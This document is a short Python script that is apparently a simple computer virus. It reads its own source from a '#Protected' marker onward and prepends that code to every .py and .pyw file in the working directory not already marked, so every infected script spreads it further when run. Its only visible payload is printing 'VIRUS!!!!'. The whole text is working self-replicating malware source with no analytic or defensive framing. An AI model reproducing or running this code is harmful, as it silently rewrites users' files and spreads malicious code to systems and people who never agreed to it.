#Protected

import sys, glob
code = []
with open(sys.argv[0],'r') as f:
    lines = f.readlines()

thisOne = False
for line in lines:
    if line == '#Protected\n':
        thisOne = True
    if thisOne:
        code.append(line)
    if line == '#end\n':
        break

T_Code = glob.glob('*.py') + glob.glob('*.pyw')

for script in T_Code:
    with open(script, 'r') as f:
        script_code = f.readlines()

    notThis = False
    for line in script_code:
        if line == '#Protected\n':
            notThis = True
            break

    if not notThis:
        newCode = []
        newCode.extend(code)
        newCode.extend('\n')
        newCode.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(newCode)



print("VIRUS!!!!")
#End